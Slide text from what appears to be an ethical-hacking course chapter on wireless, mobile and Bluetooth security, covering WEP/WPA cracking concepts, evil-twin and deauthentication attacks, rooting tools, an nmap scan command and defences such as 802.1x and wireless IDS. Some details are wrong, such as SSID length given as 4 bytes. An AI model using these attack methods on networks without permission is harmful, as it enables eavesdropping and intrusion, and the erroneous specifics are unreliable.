[slide19.xml] Wireless Mapping WirelessMon Verify  802.11  network  configuration  is correct. Test  WiFi  hardware  and  device  drivers  are  functioning correctly. Check signal levels from your local WiFi network and nearby networks. Help  locate  sources  of  interference  to  your network. WirelessMon supports the MetaGeek Wi‐Spy  (2.4i, 2.4x and DBx)  useful  for  finding  interference  from  non  802.11A/B/G/N  devices  transmitting  on  the  same frequencies Scan for hot spots in your local area (wardriving) Create signal strength maps of an area (also known as heat maps) GPS support for logging and mapping signal strength Mapping can be performed with or without a GPS unit Correctly  locate  your  wireless  antenna  (especially  important for   directional antennas). Verify  the security  settings  for  local  access points. Measure network speed & throughput and view available data rates. Help  check  Wifi  network  coverage  and range A  feature‐rich,  value‐for‐money  alternative  to NetStumbler.

[slide22.xml] Finding  Hidden SSIDs SSID  =  “go away”
[slide23.xml] Privacy Bit Identifying Crypto 802.11 frames use a “Privacy bit” a.k.a – “Secure bit” and “WEP bit” Field is supposed to be set to 1 when messages are encrypted Although it is called a WEP bit it may be WPA1, WPA2, or other types of encryption Some vendor AP’s won’t set the bit Bottom line: whether it is set or not, you must investigate further Kismet  has heuristic features to detect crypto Uses fuzzy logic so it’s not 100% correct every time Looks at the 1 st  couple of bytes of 802.11 message payload Header may be in clear-text but the payload may not
[slide24.xml] Modes Different Modes: Station (STA) Infrastructure Mode Also called managed mode STA connects to AP (Can’t connect to another STA) Access Point (AP) Infrastructure Mode In a managed AP network, it acts as the Master device Maintains list of association STAs and security policies Monitor (MON) Mode A passive mode only (no frames transmitted) Not supported by all hardware Ad-Hoc (a.k.a. – Independent Basic Service Set or IBSS) Mode Allows connection of STA to STA Wireless Distribution System (WDS) Mode Acts as a wired connection between 2 APs Mesh Allow multiple devices to communicate with each other dynamically
[slide25.xml] MAC Several Ways for MAC address collection Could conduct an ARP sweep (e.g. – nmap, superscan) We can detect which Aps are on the same subnet as nmap Nmap AP example.com nmap -Pn -n -pT:80,443,23,21,22,U:161,1900,5353 -sU -sV –sS -oA osfinger -O -T5 192.168.69.0/24 Scans te network with no ping options set (-Pn) No name resolution (-n) Scans TCP port 80,443,23,21,22 and UDP ports 161,1900,5353 Most frequently found listening on embedded devices Tell if those ports are open (-sU and -sS) Fingerprint them if the ports are open (-sV) Use an aggressive scan (-T5) Nmap AP NSE scan Nmap -sS -O --open --script=rougeap.nse Uses banner grabbing and OS fingerprinting 
[slide26.xml] Which  is  the Best? WPA/WPA1 – subset of 802.11i Requires less processing power Uses TKIP with RC4 (Stream Cipher) Much better than WEP but still weak WPA2 Also implements 802.11i functionality Computationally more complex but more secure Uses AES in mode CCMP (counter mode with cipher block chaining message authentication code protocol) Can use TKIP but should use AES
[slide27.xml] Another Tool Free Wireless analysis Tool - Kismet Developed by Dragorn – a.k.a Mike Krenshaw It is more than a sniffer but a great analysis tool Great for War Driving Detects wireless networks, gather traffic, looks for attacks with internal wireless IDS features Looks for common wireless attacks at layer 2 Works on 802.11 a/b/g/n networks Kismet is a client-server architecture Can run multiple clients with a separate server  Common for users to run both on the same system Requires a lot of libraries to be installed  Libpcap, GPSD (GPS support), Expat (XML processing) to name a few

[slide33.xml] A t t a c k i n g Authentication Attacks Not like encryption attacks Targets the process where the user provides a credential that is evaluated to establish the user ID  This attack usually ends with a brute force attack WPA Pre-Shared Key (WPA-PSK) A single key is shared among users Also used to derive the specific encryption keys used during a user’s session The client and AP perform a 4-way handshake to establish the encryption keys An attacker observing the handshake can capture the encryption keys and then brute force offline to get the PSK PSKs are hashed 4,096 times and are up to 63 characters long The SSID is used in part of the hashing

[slide44.xml] Client Attacks Based on targeting wireless software program Most common client attack approaches: Injecting traffic into a wireless session Example: Airpwn Hijacking an existing session between the client and the AP Example: AirJAck Impersonating an access point Example: Karma
[slide45.xml] Another  Attack Tool Airpwn Attack: Pronounced “Air-Pone”, it is a free tool Attacker begins by monitoring existing network connections Watches for specific traffic such as HTTP GET request for a website Attacker injects a response for the client Spoofing the MAC of the AP Client software thinks it came from the website of the AP Client believes it is legitimate so it renders the attackers content in the victim’s browser Caveat: Attackers response must get to the client prior to the real response from the website Attacker has the upper-hand since they are on the same subnet Airpwn allows an attacker to specify regular expressions for patterns in traffic to monitor When the pattern is matched, Airpwn auto-injects a response based on the attackers choice to the victim

[slide49.xml] Mobile Device Concerns Data exfiltration:   Theft of emails, attachments, PDFs, spreadsheets, and other documents on their smartphones.  Mobile malware:  75% year-over-year increase in U.S. mobile malware rates in 2014. (Lookout) 5X more malware in 2015 than the previous five years combined. (Bit9 + Carbon Black) 262% increase in the number of iOS vulnerabilities compared to 2011. (FireEye) 75% or more mobile apps would fail basic security tests. (Gartner)
[slide50.xml] Mobile Device Concerns Geolocation and location-based services:  Ability to geotag the location of photographs but can also be used by applications to identify a user’s exact location.   ZDNet found that more than a third of apps published on China’s various Android app stores track users’ mobile data without them knowing.
[slide51.xml] Mobile Device Concerns Bump attacks :  Electronically hijack a smartphones in close proximity. Jailbreaking:  Removing of software restrictions imposed by the smartphone OS.  Jailbreaking permits root access to the iOS file system and manager. Application sandbox issues :  We thought a sandbox was enough but now we know better.
[slide52.xml] OWASP Mobile Security: Top 10 Risks M1: Improper Platform Usage M2: Insecure Data Storage M3: Insecure Communication M4: Insecure Authentication  M5: Insufficient Cryptography  M6: Insecure Authorization  M7: Client Code Quality  M8: Code Tampering  M9: Reverse Engineering  M10: Extraneous Functionality Learn more at  https://www.apriorit.com/dev-blog/435-owasp-mobile-top-10-2017
[slide53.xml] BYOD Risks Confidential data:  BYOD means that confidential data will be stored on personal devices. Data leakage:  Smartphones and tablets are easily lost and stolen, which means there is the possibility of data leakage. Support of different devices:  Implementing BYOD means the organization will need to determine what devices it will support. Mixing personal and private data:  BYOD means that personal and company data will be comingled on one device. Should a lawsuit or forensic investigation occur, all data may have to be examined. Disposal:  These devices now have both personal and company data. At the end of a device’s life, it must be determined how the device will be wiped or sanitized.
[slide54.xml] Android An open source mobile device platform.  Security Design Android uses a sandbox design . This allows users to give rights to some applications and not others.   Applications are issued a user identifier (UID) when installed. The UID is used by the mobile OS to control access to files, devices, and other resources.  Applications will always run as their given UID on a particular device. Android’s runtime system tracks which permissions are issued to each application. These permission are either granted when the OS was installed or upon installation of the application by the user. 
[slide55.xml] TIP  The Device Administration API is one of the key features that makes it possible to lock down an Android device, especially when being used in a work environment.
[slide56.xml] Android rooting and hacking tools Rooting is performed to  remove the restrictions  that carriers and hardware manufacturers put on some devices. FakeToken:   A Trojan that steals mobile transaction authorization numbers and banking information from the mobile device ZitMo:  A mobile version of the Zeus bot GingerBreaker:  An Android Trojan PremiumSMS:   A Trojan that generates revenue via SMS messages Cawitt:   A Trojan designed to harvest device information AcnetSteal:  A Trojan that harvests contact data and information from the device KingoRoot OneClickRoot SuperOneClick Superboot Unrevoked Universal Androot
[slide57.xml] Jailbreaking Apple’s IOS Jailbreaking is the process of removing restrictions in iOS, and allow root access to the iOS file system so that it can run software that has not been approved by Apple.  Jailbreaking is performed for several reasons.  First  it allows the execution of unsigned code and the free modification of the underlying file system. Second , it can aid carrier unlocking, thus allowing users to use the phone with the  carrier of their choosing.    Finally , users may jailbreak to obtain functionality that is not currently offered.   For example, Apple doesn’t allow official applications to run in the background, and it doesn’t allow you to implement functionality that the company may implement in the future.     Apple’s official stance on jailbreaking is that “it eliminates security layers designed to protect your personal information and your iOS device. tool that allows you to update firmware
[slide58.xml] IOS Jailbreaking techniques Untethered Jailbreaking vs Tethered Jailbreaking: A tethered  jailbreak  requires the iOS device to be plugged into a computer when turned on. If the iPhone is not plugged into a computer and booted with special software the device will not enter a jailbroken state.  Untethered jailbreaks  do not require a computer Semi-tethered Jailbreak: Untethered meant that the device can jailbreak itself automatically every time during the boot process. Semi-untethered is a mix between the two - it needs to be jailbroken every time you reboot, but it can be done by an app on the device instead of needing to do it with a computer
[slide59.xml] Types of Jailbreaking Userland describes the software running on an iOS device after the kernel has started. A userland-based exploit or jailbreak, being entirely software-based, can be patched by Apple.  Userland exploited phones allows user-level access without iBoot access iBoot exploit iBoot is one of the bootloaders in the iPhone has a vulnerability that can be exploited.  iBoot exploited phones can be semi-tethered.  iBoot exploited phones allow file system and iBoot access. The bootROM is the first code ran in the booting process of the iPhone. It's stored in a part of the memory that's read-only (ROM : Ready-Only Memory) and contains very little code (so very few chances of finding a vulnerability). Gaining control of this with an exploit allows you to modify any subsequent part of the booting process (LLB/iBoot/Kernel). BootRom exploited phones allow file system and iBoot access. Remember Userland is the only one that doesn’t allow admin access
[slide60.xml] Jailbreaking Apple’s IOS Tools Rooting for Androids, Jailbreaking for IOS, both do the same thing. Well-known jailbreaking applications  include the following: Cydia : Specifically designed for jailbreaking Redsn0w : A newer jailbreaking application designed to jail break both tethered and untethered devices Absinthe : Designed to jailbreak untethered devices sn0wbreeze : Jailbreaking tool that allows for the creating of a custom pre-jail broken firmware file PwnageTool : Jailbreaking tool that allows you to update firmware
[slide61.xml] Windows Phones Security Windows phones use a four-tiered security model to control access of code to the device and OS (windows phone refers to these tiers as "chambers").  Using a tiered system ensures that threats to the outer levels cannot be escalated as attacks on the inner levels - and that the inner levels are smaller and expose much less opportunity for attack in the first place. Chambers  provide a security boundary in which processes are created and execute.  Capabilities  are a security-sensitive feature that can be granted to code that runs in a chamber.  One such capability is the secure boot process.   This ensures safe launching of the OS and only allows trusted components to get loaded.  This is handled in part by the Unified Extensible Firmware Interface (UEFI). UEFI can secure the boot process by preventing the loading of drivers or OS loaders that are not signed or deemed secure.
[slide62.xml] Windows Phone Security Architecture Windows Phone processes and applications execute in isolated chambers that are each configured with their own security policy. Windows Phone Security Architecture has four chamber types:  1.  Trusted Computer Base (TCB) Chamber:  Configured with the greatest set of privileges; allows processes to have unrestricted access to system resources. – Ex: Kernel, Windows Phone drivers  2.  Elevated Rights Chamber (ERC):   Processes have access to all system resources except the security policy. – Ex: phone application services, user mode drivers  3.  Standard Rights Chamber (SRC):  For processes and apps that do not provide a “device-wide” service; default chamber for pre-installed Windows Phone applications. – Ex: Microsoft Outlook Mobile 2010  4.  Least Privileged Chamber (LPC):  Security policy is defined based on stated capabilities of third-party apps installed from the Windows Phone Marketplace. – Ex: Facebook, Twitter 
[slide63.xml] Windows Phone Security (Application Development) Phone developers must be registered with Microsoft before it can be submitted for review.  So if I'm developing apps for the Windows Phone, Microsoft has to know I'm creating them; because I have to register with them first.   All applications are code-signed by VeriSign on behalf of the developer. If it's not signed, it's not going to run.
[slide64.xml] BlackBerry By Research in Motion (RIM). Uses a Java-based application.    Some potential attack vectors include: JAD file exploits, malicious code signing, memory manipulations, SMS SMiShing exploits, and personal information data attacks. Well-known hacking tools include the following: Bugs and Kisses: BlackBerry spyware PhoneSnoop: BlackBerry Trojan ZitMo: A mobile version of the Zeus bot that can run on Android and Black-Berry devices
[slide65.xml] Mobile Device Management and Protection These controls can be placed into three broad categories: Physical controls: Mandatory username and password. Password lock out, typically, three to five attempts.  Storage media should be encrypted. Technical controls: Antivirus, encryption, and remote wipe.  Enable auto-lock and set a short lockout time such as 1 minute. Centralized device management and restricting user access.  A virtual private network (VPN) should be utilized. Administrative controls:  Policies, procedures, and training on proper usage.
[slide66.xml] Mobile Phone security tools Security tools available include the following: BullGuard Mobile Security Lookout WISeID
[slide67.xml] Bluetooth (802.15) Operates at a frequency  of 2.45GHz The three classifications of Bluetooth are as follows: Class 1 : Has the longest range (up to 100 meters) and has 100mW of power. Class 2 : Although not the most popular, it allows  transmission of up to 20 meters and has 2.5mW of power. Class 3 : This is the most widely implemented and supports a transmission distance of 10 meters and has 1mW of power. Class 4:  The newest version of Bluetooth implemented. It supports a transmission distance of .5 meter and has .5mW of power.
[slide68.xml] Bluetooth Attack tools SuperBluetooth Hack : A small mobile Bluetooth Trojan. Bluesniff : Used for Bluetooth war driving. BlueScanner : A Bluetooth scanning program that can identify Bluetooth devices that are within range, and export the scan results to a text file and sort the findings. BlueBug : A tool that exploits a Bluetooth security loophole on some Bluetooth-enabled cell phones. It can steal phone books and call lists, in addition to the sending and reading of SMS messages from the attacked phone. BTCrack:  This Bluetooth PIN-cracking tool can be used to crack PINs captured during the pairing process.
[slide69.xml] Bluetooth attacks Bluejacking  allows an individual to send unsolicited messages over Bluetooth to other Bluetooth devices.  This can include text, images, or sounds.  Bluesnarfing  is the theft of data, calendar information, or phone book entries.   This means that any one within range can make a connection to your Bluetooth device and download any information they want without your knowledge or permission.   Although the range for such attacks was believed to be quite short, Flexilis, a wireless think tank based in Los Angeles, has demonstrated a  BlueSniper rifle  that can pick up Bluetooth signals from up to a mile away. 
[slide70.xml] Wireless connection types Ad Hoc (peer to peer) Ad hoc mode doesn’t need any equipment except two wireless network adaptors.    Ad hoc allows a point-to-point type of communication that works well for small networks and is based on a peer-to-peer style of communication.   Infrastructure mode  Centered around a wireless access point (AP). An AP is a centralized wireless device that controls the traffic in the wireless medium.   Compared to ad hoc wireless networks, infrastructure mode networks are more scalable and offer centralized security management.
[slide71.xml] Same Service Set ID (SSID). Each device communicates to the AP, which then forwards the data to the appropriate computer.   Each device must be configured to use the same Service Set ID (SSID).  The SSID is the wireless network name.   It can be up to 32 bits (4 bytes)  and is case sensitive.    The SSID can be easily sniffed. 
[slide72.xml] Wireless uses CSMA/CA WLANs use carrier sense multiple access with collision avoidance (CSMA/CA) Ethernet Each device listens before it sends a packet, and if it detects that someone is transmitting, it  waits for a random period  and tries again. If it listens and discovers that no one is transmitting, it sends a short message known as the ready-to-send (RTS). Wired networks use carrier sense multiple access with collision detection (CSMA/CD) Ethernet.  In a wired network, it’s easy for any one of the devices to detect if another device is transmitting.   
[slide73.xml] Wireless LAN Frequencies and Speeds IEEE Standard Frequency/Medium Speed 802.11 2.4GHz RF 1 to 2Mbps 802.11a 5GHz Up to 54Mbps 802.11b 2.4GHz Up to 11Mbps 802.11g 2.4GHz Up to 54Mbps 802.11n 2.4GHz/5GHz Up to 600Mbps
[slide74.xml] Channels The 802.11b, 802.11g, and 802.11n systems divide the usable spectrum into  14 overlapping staggered channels  whose frequencies are 5 MHz apart.  The channels available for use in a particular country differ according to the regulations of that country.  For example, in North America,  11 channels are supported,  whereas most European countries support 13 channels
[slide75.xml] Spread-spectrum technology Pioneered by the military to make eavesdropping difficult and increase the difficulty of signal jamming.  Transmits data over a wide range of radio frequencies.  Lessens noise interference and enables data rates to speed up or slow down, depending on the quality of the signal.   
[slide76.xml] Spread-spectrum technologies Direct-sequence spread spectrum (DSSS):  Divides the stream of data into bits. These bits are mapped to a pattern of ratios called a  spreading code . The higher the  spreading code , the more the signal is resistant to interference but the less bandwidth is available. The transmitter and the receiver must be synchronized to the same  spreading code . Frequency-hopping spread spectrum (FHSS): Operates by taking a broad slice of the bandwidth spectrum and dividing it into smaller  subchannels  of about 1MHz.  The transmitter then hops between  subchannels , sending out short bursts of data on each  subchannel  for a short period of time. This is known as the dwell time.   For FHSS to work, all communicating devices must know the dwell time and must use the same hopping pattern.  Because FHSS uses more  subchannels  than DHSS, it can support more wireless devices. Orthogonal frequency-division multiplexing (OFDM): Splits the signal into smaller subsignals  that use a frequency-division multiplexing technique to send different pieces of the data to the receiver on  different frequencies  simultaneously.
[slide77.xml] IEEE 802.11 Standards IEEE Standard RF Used Spread Spectrum Data Rate (in Mbps) 802.11 2.4GHz DSSS 1 or 2 802.11 2.4GHz FHSS 1 or 2 802.11a 5GHz OFDM 54 802.11b 2.4GHz DSSS 11 802.11g 2.4Ghz DSSS 54 802.11n 2.4/5GHz OFDM 600 (theoretical)
[slide78.xml] Wireless Equivalent Privacy (WEP) vulnerability WEP is based on the  RC4  symmetric encryption standard and uses either 40-bit (or WEP2=128-bit) key.  However, the keys are not really this many bits, because a 24-bit initialization vector (IV) is used to provide randomness.  A 40 bit key plus a 24-bit IV is too small a key for todays (or yesterdays) encryption . 
[slide79.xml] Another WEP vulnerability  Let’s assume that our pre-shared key is the word “hacker”.   This word would be merged with qrs to create the secret key of “qrshacker”.  This secret key is used to encrypt every packet.   WEP requires each new packet to generate a new IV, it would still use the pre-shared key of “hacker”, but this time it would concatenate the pre-shared key of “hacker”, with the value mno to create a new secret key of “mnohacker”.   This would continue for each packet of data created.  This means that the only changing part of the secret key is the IV, which is what WEP cracking is interested in.  A busy AP that sends a constant flow of traffic will actually use up all possible IVs after 5 or 6 hours.   
[slide80.xml] Cracking WEP WEP does not encrypt the entire transmission.  The header and trailer of the frame are sent in clear text.  This means that even when encryption is used, a MAC address can be sniffed. To passively crack WEP, the hacker has to capture 5 to 10 million packets, which would take some time on most networks.  This changed in August 2004, when a hacker known KoreK released a new piece of attack code that sped up WEP key recovery by nearly two orders of magnitude. Instead of using the passive approach of collecting millions of packets to crack the WEP key, his concept was to actively inject packets into the network.  The idea is to solicit a response from legitimate devices from the WLAN.  Even though the hacker can’t decipher these packets in an encrypted form, he can guess what they are and use them in a way to provoke additional traffic-generating responses.  This makes it possible to crack WEP in less than 10 minutes on many wireless networks
[slide81.xml] Wi-Fi Protected Access (WPA)  Wi-Fi Protected Access (WPA) was developed  as an interim  to WEPs problems. WPA delivers a level of security way beyond what WEP offers.   WPA uses Temporal Key Integrity Protocol (TKIP).  TKIP scrambles the keys using a hashing algorithm and adds an integrity-checking feature verifying that the keys haven’t been tampered with.  WPA improves on WEP by increasing the IV from 24 bits to 48. Rollover also has to be eliminated, which means that key reuse is less likely to occur. WPA also avoids another weakness of WEP by using a different secret key for each packet .  Another improvement in WPA is message integrity.  WPA addressed a message integrity check (MIC) known as Michael.   Michael is designed to detect invalid packets and can even take measures to prevent attacks.
[slide82.xml] Wi-Fi Protected Access2 (WPA2)  In 2004, the IEEE approved the real successor to WEP, which was WPA2.  It is officially known as 802.11.i. This wireless security standard makes use of the Advanced Encryption Standard (AES).   Key sizes of up to 256 bit are now available, which is a vast improvement from the original 40-bit encryption WEP used. It also includes built-in RADIUS support.
[slide83.xml] WEP vs WPA vs WPA2
[slide84.xml] Searching for WLANs War chalking : The act of marking buildings or sidewalks with chalk to show others where it’s possible to access an exposed company wireless network.  Figure 9-4, Page 376 War driving : The act of finding and marking the locations and status of wireless networks, this activity is usually performed by automobile.   The war driver typically uses a GPS device to record the location and a discovery tool such as  NetStumbler . War flying : Similar to war driving, except that a plane is used instead of a car
[slide85.xml] Eavesdropping If the attacker is within range, he can simply intercept radio signals and decode the data being transmitted.  Nothing more than a wireless sniffer and the ability to place the NIC into promiscuous mode is required.  Remember that promiscuous mode means that the adapter has the capability to capture all packets, not just those addressed to the client.  If the hacker uses an antenna, he can be even farther away, which makes these attacks hard to detect and prevent. 
[slide86.xml] Configured as Open Authentication  Open systems authentication means that no authentication is used .   Some wireless equipment is sold with this as a default.  Many hotels, business centers, coffee shops, and restaurants provide wireless access with open authentication. In these situations,  it is excessively easy for a hacker to gain unauthorized information, resource hijacking, or even introduce backdoors into other systems.   Just think about it, one of the first things most users do is check their email.  This means that usernames and passwords are being passed over a totally unsecure network.
[slide87.xml] AP spoofing and Evil-Twin AP spoofing occurs when the hacker sets up his own rogue AP near the victim’s network or in a public place where the victim might try to connect.   If the spoofed AP has the stronger signal, the victim’s computer will choose the spoofed AP.   This puts the hacker right in the middle of all subsequent transmissions.  From this man-in-the-middle attack, the hacker can attempt to steal usernames and passwords or simply monitor traffic.    An evil-twin attack is nothing more than a rogue WiFi AP that appears to be a legitimate one offered on the premises but that actually has been set up to eavesdrop on wireless communications.    Figure 9-5  on Page 380 shows an example of this. While you might be thinking that this is somewhat difficult to accomplish, a number of tools are available to carry out these types of evil twin attacks.  
[slide88.xml] Wireless Denial of Service (DoS) attacks Authentication flood attack:  The attacker generates a flood of EAPOL messages requesting 802.1x authentication. As a result, the authentication server is overwhelmed cannot respond to anything. De-authentication flood attack:  Targets an individual client and works by sending a stream of spoofed  de-authentication frames from the AP to the victim. It is sometimes called the Fatajack attack.  Network-jamming attack:  Targets the entire wireless network. The attacker use a transmitter to flood the airwaves in the vicinity of the wireless network.  Equipment destruction attack:  The hacker uses a high-output transmitter with a directional high-gain antenna to pulse the AP. High-energy radio frequency (RF) power will damage electronics in the AP, resulting in it being permanently out of service. 
[slide89.xml] Wireless Attack methodology Discover WiFi Networks Perform GPS Mapping Wireless Traffic Analysis Launch Wireless Attacks Crack and Compromise the WiFi Network

Some site survey tools can be used for this purpose, but there are also a number of websites that can help, including  WiFi  Finder for Android by  JiWire ,  https://play.google.com/store/apps/details?id=com.jiwire.android.finder&hl=en Also, websites like  WiGLE  can be used to search for mapped wireless networks,  https://wigle.net/
[slide92.xml] Wireless Traffic Analysis Used to determine what type of traffic is being sent over the wireless network and what wireless security controls are in place.    Items reviewed include SSID, identification of APs, recovery of hidden SSIDS, and determination of authentication methods.    Some of the packet-sniffer tools to be used at this point include the following: Wireshark with AirPcap adaptor Cascade Pilot OmniPeek CommView for Wi-Fi
[slide93.xml] Launch Wireless Attacks Once discovery, mapping and traffic analysis is complete, the attack can be launched.   This might include revealing hidden SSIDs, fragmentation attacks, MAC spoofing, DoS attacks, man-in-the-middle attacks, or even a evil-twin attack.  Several popular tools are shown here on Page 383:
[slide94.xml] Crack and Compromise the Wi-Fi Network AirSnort: A Linux-based WLAN WEP cracking tool that recovers encryption keys.    captures packets and then computing the encryption key when the program captures enough packets. coWAPtty: Used to recover WPA encryption keys. Cain and Abel:  Used to recover WEP and WPA encryption keys with an associated AirPcap adaptor. [slide95.xml] Securing Wireless Networks Same as those used in wired networks.  The principle of defense in depth.  Encrypting data  Limiting access based on least privilege Providing physical protection and security to the hardware Strong authentication Employing layers of security controls to limit the damage should one layer of security be overcome Example figure 9-7 on Page 384
[slide96.xml] Securing Wireless Networks A RADIUS server behind the  firewall. Changing the default value of the SSID.  The SSID can operate in one of  two modes .  By default,  the WAP broadcasts its SSID at periodic intervals . A hacker can easily discover this value and then attempt to connect to WAP. Configuring the WAP not to broadcast the SSID,  the wireless device can only connect with the WAP if the SSID is known.   If the SSID is unknown, the WAP will reject the management frames and no association occurs.

[slide99.xml] Site Survey The goal of a site survey is to gather enough information to determine whether the client has the right number and placement of APs to provide adequate coverage throughout the facility. It is also important to check and see how far the signal radiates outside the facility. Finally, you will want to do a thorough check for rogue APs.   Too often, APs show up in locations where they should not have been.  These are as big a threat, if not bigger, than the weak encryption you might have found.  A site survey is also useful in detecting the presence of interference coming from other sources that could degrade the performance of the wireless network. The six basic steps of a site survey are as follows on Page 386:
[slide100.xml] Robust Wireless Authentication (802.1x) 802.1x provides port-based access control.  When used in conjunction with Extensible Authentication Protocol (EAP), it can be used as a means to authenticate devices that attempt to connect to a specific LAN port.  Although  EAP  was designed for the wired world, it’s being bundled with WPA  as a means of communicating authentication information and encryption keys between a client or server,  and an access control server such as RADIUS. 
[slide101.xml] How EAP works The WAP requests authentication information from the client. The client supplies the requested authentication information. The WAP then forwards the client supplied authentication information to a standard RADIUS server for authentication and authorization. The client is allowed to connect and transmit data upon authorization from the RADIUS server.
[slide102.xml] Misuse Detection A wireless IDS works much like wired IDS in that it monitors traffic and can alert the administrator when traffic is found to be suspect  A wireless IDS can be centralized or decentralized and should have a combination of sensors that collect and forward wireless data.  Wireless attacks are unlike wired attacks in that the hacker is often physically located at or close to the local premise.   Some wireless IDS systems can provide a general estimate of the hacker’s physical location. Therefore, if alert data is provided quickly, security professionals can catch the hackers while launching the attack.
[slide103.xml] Wireless IDS products  Some commercial wireless IDS products include : Airdefense RogueWatch  and  Internet Security Systems  RealSecure  Server Sensor and Wireless Scanner. Kismet Open-source solutions: AirSnare ,  WIDZ, and  Snort-Wireless, 
[slide104.xml] Internet of Things (IoT) The interconnection via the Internet of computing devices embedded in everyday objects, enabling them to send and receive data. The Internet of things (IoT) is the extension of Internet connectivity into physical devices and everyday objects. The definition of the Internet of things has evolved due to the convergence of multiple technologies, real-time analytics, machine learning, commodity sensors, and embedded systems. "if one thing can prevent the Internet of things from transforming the way we live and work, it will be a breakdown in security“ Remember: Vehicle Ad Hoc Network (VANET)

DECK 17: Chapter Seventeen - Firewalls & IDS.pptx
